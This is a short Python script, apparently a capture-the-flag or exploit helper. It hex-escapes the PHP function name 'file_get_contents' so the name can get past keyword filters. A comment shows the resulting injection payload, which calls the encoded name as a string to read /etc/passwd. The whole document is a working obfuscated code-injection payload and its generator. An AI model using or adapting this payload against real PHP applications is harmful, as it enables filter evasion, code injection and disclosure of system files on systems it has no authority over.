cmd='file_get_contents'

payload=''
for c in cmd:
        payload+=f'\\x{hex(ord(c))[2:]}'

payload+=""

print(payload)
#<?php "\x66\x69\x6c\x65\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73"("/etc/passwd");?>
